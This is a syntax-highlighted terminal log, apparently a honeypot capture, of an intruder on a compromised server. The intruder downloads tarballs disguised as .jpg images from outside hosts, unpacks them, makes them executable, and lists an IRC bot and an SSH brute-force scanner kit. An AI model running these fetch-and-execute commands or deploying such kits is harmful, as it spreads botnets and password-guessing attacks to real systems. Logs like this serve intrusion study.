
<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,# <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">pinky</span>.<span class="nv">clan</span>.<span class="nv">su</span><span class="o">/</span><span class="nv">mech</span><span class="o">/</span><span class="nv">fast</span>.<span class="nv">jpg</span> <span class="c1">;  tar fast.jpg</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">21</span>:<span class="mi">07</span>:<span class="mi">41</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">pinky</span>.<span class="nv">clan</span>.<span class="nv">su</span><span class="o">/</span><span class="nv">mech</span><span class="o">/</span><span class="nv">fast</span>.<span class="nv">jpg</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">pinky</span>.<span class="nv">clan</span>.<span class="nv">su</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">821334</span> <span class="ss">(</span><span class="mi">802</span><span class="nv">K</span><span class="ss">)</span> [<span class="nv">image</span><span class="o">/</span><span class="nv">jpeg</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">fast</span>.<span class="nv">jpg</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">821</span>,<span class="mi">334</span>      <span class="mi">113</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">0</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">21</span>:<span class="mi">07</span>:<span class="mi">49</span> <span class="ss">(</span><span class="mi">113</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">fast</span>.<span class="nv">jpg</span><span class="s1">&#39;</span><span class="s"> saved [821334/821334]</span>

<span class="nv">tar</span>: <span class="nv">You</span> <span class="nv">must</span> <span class="nv">specify</span> <span class="nv">one</span> <span class="nv">of</span> <span class="nv">the</span> `<span class="o">-</span><span class="nv">Acdtrux</span><span class="s1">&#39;</span><span class="s"> options</span>

<span class="nv">Try</span> `<span class="nv">tar</span> <span class="o">--</span><span class="nv">help</span><span class="s1">&#39;</span><span class="s"> or `tar --usage</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="nv">more</span> <span class="nv">information</span>.

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,# <span class="nv">tar</span> <span class="nv">zxvf</span> <span class="nv">fast</span>.<span class="nv">jpg</span>
<span class="nv">fast</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">xmech</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">xmech</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">vars</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">vars</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">userlist</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">userlist</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">usage</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">text</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">structs</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">socket</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">socket</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">parse</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">parse</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">mcmd</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">Makefile</span>.<span class="nv">in</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">Makefile</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">main</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">main</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">link</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">link</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">h</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">global</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">gencmd</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">gencmd</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">function</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">function</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">defines</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">debug</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">debug</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">dcc</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">dcc</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">config</span>.<span class="nv">h</span>.<span class="nv">in</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">config</span>.<span class="nv">h</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">commands</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">commands</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">combot</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">combot</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">com</span><span class="o">-</span><span class="nv">ons</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">com</span><span class="o">-</span><span class="nv">ons</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">channel</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">channel</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">cfgfile</span>.<span class="nv">o</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">src</span><span class="o">/</span><span class="nv">cfgfile</span>.<span class="nv">c</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rversions</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rtsay</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rsignoff</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rsay</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rpickup</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rnicks</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rkicks</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rinsult</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">raway</span>.<span class="nv">e</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">mkindex</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">Makefile</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">m</span>.<span class="nv">help</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">LinkEvents</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">go</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">genuser</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">configure</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">checkmech</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">bash</span>
<span class="nv">fast</span><span class="o">/</span><span class="mi">3</span>.<span class="nv">user</span>
<span class="nv">fast</span><span class="o">/</span><span class="mi">2</span>.<span class="nv">user</span>
<span class="nv">fast</span><span class="o">/</span><span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">fast</span><span class="o">/</span><span class="nv">configure</span>.<span class="nv">c</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,# <span class="nv">cd</span> <span class="nv">fast</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.           ..          <span class="nv">src</span>         <span class="nv">r</span>           <span class="nv">mkindex</span>     <span class="nv">Makefile</span>
<span class="nv">m</span>.<span class="nv">set</span>       <span class="nv">m</span>.<span class="nv">help</span>      <span class="nv">LinkEvents</span>  <span class="nv">go</span>          <span class="nv">genuser</span>     <span class="nv">configure</span>
<span class="nv">checkmech</span>   <span class="nv">bash</span>        <span class="mi">3</span>.<span class="nv">user</span>      <span class="mi">2</span>.<span class="nv">user</span>      <span class="mi">1</span>.<span class="nv">user</span>      <span class="nv">configure</span>.<span class="nv">c</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">vi</span> <span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">E558</span>: <span class="nv">Terminal</span> <span class="nv">entry</span> <span class="nv">not</span> <span class="nv">found</span> <span class="nv">in</span> <span class="nv">terminfo</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">pico</span> <span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">bash</span>: <span class="nv">pico</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">apt</span><span class="o">-</span><span class="nv">get</span>  <span class="nv">install</span> <span class="nv">pico</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">lists</span>... <span class="nv">Done</span>
<span class="nv">Building</span> <span class="nv">dependency</span> <span class="nv">tree</span>
<span class="nv">Reading</span> <span class="nv">state</span> <span class="nv">information</span>... <span class="nv">Done</span>
<span class="nv">The</span> <span class="nv">following</span> <span class="nv">NEW</span> <span class="nv">packages</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">installed</span>:
  <span class="nv">pico</span>
<span class="mi">0</span> <span class="nv">upgraded</span>, <span class="mi">1</span> <span class="nv">newly</span> <span class="nv">installed</span>, <span class="mi">0</span> <span class="nv">to</span> <span class="nv">remove</span> <span class="nv">and</span> <span class="mi">259</span> <span class="nv">not</span> <span class="nv">upgraded</span>.
<span class="nv">Need</span> <span class="nv">to</span> <span class="nv">get</span> <span class="mi">158</span>.<span class="mi">2</span><span class="nv">kB</span> <span class="nv">of</span> <span class="nv">archives</span>.
<span class="nv">After</span> <span class="nv">this</span> <span class="nv">operation</span>, <span class="mi">347</span>.<span class="mi">6</span><span class="nv">kB</span> <span class="nv">of</span> <span class="nv">additional</span> <span class="nv">disk</span> <span class="nv">space</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">used</span>.
<span class="nv">Get</span>:<span class="mi">1</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">ftp</span>.<span class="nv">debian</span>.<span class="nv">org</span> <span class="nv">stable</span><span class="o">/</span><span class="nv">main</span> <span class="nv">pico</span> <span class="mi">1</span>.<span class="mi">15</span><span class="o">-</span><span class="mi">7</span> [<span class="mi">158</span>.<span class="mi">2</span><span class="nv">kB</span>]
<span class="nv">Fetched</span> <span class="mi">158</span>.<span class="mi">2</span><span class="nv">kB</span> <span class="nv">in</span> <span class="mi">1</span><span class="nv">s</span> <span class="ss">(</span><span class="mi">4493</span><span class="nv">B</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">fields</span>... <span class="nv">Done</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">status</span>... <span class="nv">Done</span>
<span class="ss">(</span><span class="nv">Reading</span> <span class="nv">database</span> ... <span class="mi">177887</span> <span class="nv">files</span> <span class="nv">and</span> <span class="nv">directories</span> <span class="nv">currently</span> <span class="nv">installed</span>.<span class="ss">)</span>
<span class="nv">Unpacking</span> <span class="nv">pico</span> <span class="ss">(</span><span class="nv">from</span> ...<span class="o">/</span><span class="nv">archives</span><span class="o">/</span><span class="nv">pico_1</span>.<span class="mi">15</span><span class="o">-</span><span class="mi">7</span><span class="nv">_i386</span>.<span class="nv">deb</span><span class="ss">)</span> ...
<span class="nv">Processing</span> <span class="nv">triggers</span> <span class="k">for</span> <span class="nv">man</span><span class="o">-</span><span class="nv">db</span> ...
<span class="nv">Setting</span> <span class="nv">up</span> <span class="nv">pico</span> <span class="ss">(</span><span class="mi">1</span>.<span class="mi">15</span><span class="o">-</span><span class="mi">7</span><span class="ss">)</span> ...

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">pico</span> <span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">pico</span>: <span class="nv">Segmentation</span> <span class="nv">fault</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># .<span class="o">/</span><span class="nv">pico</span> <span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">bash</span>: .<span class="o">/</span><span class="nv">pico</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">wget</span> <span class="nv">pinky</span>.<span class="nv">clan</span>.<span class="nv">su</span><span class="o">/</span><span class="nv">altele</span><span class="o">/</span><span class="nv">pico</span>.<span class="nv">jpg</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">21</span>:<span class="mi">09</span>:<span class="mi">32</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">pinky</span>.<span class="nv">clan</span>.<span class="nv">su</span><span class="o">/</span><span class="nv">altele</span><span class="o">/</span><span class="nv">pico</span>.<span class="nv">jpg</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">pinky</span>.<span class="nv">clan</span>.<span class="nv">su</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">84478</span> <span class="ss">(</span><span class="mi">82</span><span class="nv">K</span><span class="ss">)</span> [<span class="nv">image</span><span class="o">/</span><span class="nv">jpeg</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">pico</span>.<span class="nv">jpg</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">84</span>,<span class="mi">478</span>       <span class="mi">27</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">1</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">21</span>:<span class="mi">09</span>:<span class="mi">34</span> <span class="ss">(</span><span class="mi">27</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">pico</span>.<span class="nv">jpg</span><span class="s1">&#39;</span><span class="s"> saved [84478/84478]</span>
<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">tar</span> <span class="nv">zxvf</span> <span class="nv">pico</span>.<span class="nv">jpg</span>
<span class="nv">pico</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># .<span class="o">/</span><span class="nv">pico</span> <span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">Shall</span> <span class="nv">we</span> <span class="nv">play</span> <span class="nv">a</span> <span class="nv">game</span>?
<span class="nv">A</span> <span class="nv">strange</span> <span class="nv">game</span>. <span class="nv">The</span> <span class="nv">only</span> <span class="nv">winning</span> <span class="nv">move</span> <span class="nv">is</span> <span class="nv">not</span> <span class="nv">to</span> <span class="nv">play</span>.  <span class="nv">How</span> <span class="nv">about</span> <span class="nv">a</span> <span class="nv">nice</span> <span class="nv">game</span> <span class="nv">of</span> <span class="nv">chess</span>?

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># .<span class="o">/</span><span class="nv">pico</span> <span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">Shall</span> <span class="nv">we</span> <span class="nv">play</span> <span class="nv">a</span> <span class="nv">game</span>? <span class="nv">y</span>
<span class="nv">A</span> <span class="nv">strange</span> <span class="nv">game</span>. <span class="nv">The</span> <span class="nv">only</span> <span class="nv">winning</span> <span class="nv">move</span> <span class="nv">is</span> <span class="nv">not</span> <span class="nv">to</span> <span class="nv">play</span>.  <span class="nv">How</span> <span class="nv">about</span> <span class="nv">a</span> <span class="nv">nice</span> <span class="nv">game</span> <span class="nv">of</span> <span class="nv">chess</span>?

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span>#

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.           ..          <span class="nv">src</span>         <span class="nv">r</span>           <span class="nv">mkindex</span>     <span class="nv">Makefile</span>
<span class="nv">m</span>.<span class="nv">set</span>       <span class="nv">m</span>.<span class="nv">help</span>      <span class="nv">LinkEvents</span>  <span class="nv">go</span>          <span class="nv">genuser</span>     <span class="nv">configure</span>
<span class="nv">checkmech</span>   <span class="nv">bash</span>        <span class="mi">3</span>.<span class="nv">user</span>      <span class="mi">2</span>.<span class="nv">user</span>      <span class="mi">1</span>.<span class="nv">user</span>      <span class="nv">configure</span>.<span class="nv">c</span>
<span class="nv">pico</span>.<span class="nv">jpg</span>    <span class="nv">pico</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">apt</span><span class="o">-</span><span class="nv">get</span> <span class="nv">install</span> <span class="nv">vi</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">lists</span>... <span class="nv">Done</span>
<span class="nv">Building</span> <span class="nv">dependency</span> <span class="nv">tree</span>
<span class="nv">Reading</span> <span class="nv">state</span> <span class="nv">information</span>... <span class="nv">Done</span>
<span class="nv">The</span> <span class="nv">following</span> <span class="nv">NEW</span> <span class="nv">packages</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">installed</span>:
  <span class="nv">vi</span>
<span class="mi">0</span> <span class="nv">upgraded</span>, <span class="mi">1</span> <span class="nv">newly</span> <span class="nv">installed</span>, <span class="mi">0</span> <span class="nv">to</span> <span class="nv">remove</span> <span class="nv">and</span> <span class="mi">259</span> <span class="nv">not</span> <span class="nv">upgraded</span>.
<span class="nv">Need</span> <span class="nv">to</span> <span class="nv">get</span> <span class="mi">442</span>.<span class="mi">2</span><span class="nv">kB</span> <span class="nv">of</span> <span class="nv">archives</span>.
<span class="nv">After</span> <span class="nv">this</span> <span class="nv">operation</span>, <span class="mi">972</span>.<span class="mi">4</span><span class="nv">kB</span> <span class="nv">of</span> <span class="nv">additional</span> <span class="nv">disk</span> <span class="nv">space</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">used</span>.
<span class="nv">Get</span>:<span class="mi">1</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">ftp</span>.<span class="nv">debian</span>.<span class="nv">org</span> <span class="nv">stable</span><span class="o">/</span><span class="nv">main</span> <span class="nv">vi</span> <span class="mi">0</span>.<span class="mi">12</span><span class="o">-</span><span class="mi">1</span> [<span class="mi">442</span>.<span class="mi">2</span><span class="nv">kB</span>]
<span class="nv">Fetched</span> <span class="mi">442</span>.<span class="mi">2</span><span class="nv">kB</span> <span class="nv">in</span> <span class="mi">1</span><span class="nv">s</span> <span class="ss">(</span><span class="mi">4493</span><span class="nv">B</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">fields</span>... <span class="nv">Done</span>
<span class="nv">Reading</span> <span class="nv">package</span> <span class="nv">status</span>... <span class="nv">Done</span>
<span class="ss">(</span><span class="nv">Reading</span> <span class="nv">database</span> ... <span class="mi">177887</span> <span class="nv">files</span> <span class="nv">and</span> <span class="nv">directories</span> <span class="nv">currently</span> <span class="nv">installed</span>.<span class="ss">)</span>
<span class="nv">Unpacking</span> <span class="nv">vi</span> <span class="ss">(</span><span class="nv">from</span> ...<span class="o">/</span><span class="nv">archives</span><span class="o">/</span><span class="nv">vi_0</span>.<span class="mi">12</span><span class="o">-</span><span class="mi">1</span><span class="nv">_i386</span>.<span class="nv">deb</span><span class="ss">)</span> ...
<span class="nv">Processing</span> <span class="nv">triggers</span> <span class="k">for</span> <span class="nv">man</span><span class="o">-</span><span class="nv">db</span> ...
<span class="nv">Setting</span> <span class="nv">up</span> <span class="nv">vi</span> <span class="ss">(</span><span class="mi">0</span>.<span class="mi">12</span><span class="o">-</span><span class="mi">1</span><span class="ss">)</span> ...

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">vi</span> <span class="mi">1</span>.<span class="nv">user</span>
<span class="nv">E558</span>: <span class="nv">Terminal</span> <span class="nv">entry</span> <span class="nv">not</span> <span class="nv">found</span> <span class="nv">in</span> <span class="nv">terminfo</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span>#

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">root</span><span class="o">-</span><span class="nv">arhive</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">scanner</span><span class="o">/</span><span class="nv">goshNEW</span>.<span class="nv">jpg</span>  <span class="c1">; tar zxvf goshNEW.jpg ; cd goshNEW ; chmod +x *</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,<span class="o">/</span><span class="nv">fast</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,# <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.        ..       <span class="nv">fast</span>.<span class="nv">jpg</span> <span class="nv">fast</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span><span class="o">/</span>,# <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">root</span><span class="o">-</span><span class="nv">arhive</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">scanner</span><span class="o">/</span><span class="nv">goshNEW</span>.<span class="nv">jpg</span>  <span class="c1">; tar zxvf goshNEW.jpg ; cd goshNEW ; chmod +x *</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">21</span>:<span class="mi">11</span>:<span class="mi">59</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">root</span><span class="o">-</span><span class="nv">arhive</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">scanner</span><span class="o">/</span><span class="nv">goshNEW</span>.<span class="nv">jpg</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">root</span><span class="o">-</span><span class="nv">arhive</span>.<span class="k">do</span>.<span class="nv">am</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">3144067</span> <span class="ss">(</span><span class="mi">2</span><span class="nv">M</span><span class="ss">)</span> [<span class="nv">image</span><span class="o">/</span><span class="nv">jpeg</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">goshNEW</span>.<span class="nv">jpg</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">3</span>,<span class="mi">144</span>,<span class="mi">067</span>    <span class="mi">759</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">0</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">21</span>:<span class="mi">12</span>:<span class="mi">03</span> <span class="ss">(</span><span class="mi">759</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">goshNEW</span>.<span class="nv">jpg</span><span class="s1">&#39;</span><span class="s"> saved [3144067/3144067]</span>

<span class="nv">goshNEW</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">a</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">userrootmic</span>.<span class="nv">txt</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">gen</span><span class="o">-</span><span class="nv">pass</span>.<span class="nv">h</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">mass</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="mi">2</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">ss</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">pscan2</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">secure</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">ssh</span><span class="o">-</span><span class="nv">scan</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">sortateusr</span>.<span class="nv">txt</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">CITESTE</span><span class="o">-</span><span class="nv">INAINTE</span><span class="o">-</span><span class="nv">SA</span><span class="o">-</span><span class="nv">INCEPI</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">vuln</span>.<span class="nv">txt</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">common</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="mi">1</span>
<span class="nv">goshNEW</span><span class="o">/</span><span class="nv">gen</span><span class="o">-</span><span class="nv">pass</span>.<span class="nv">sh</span>
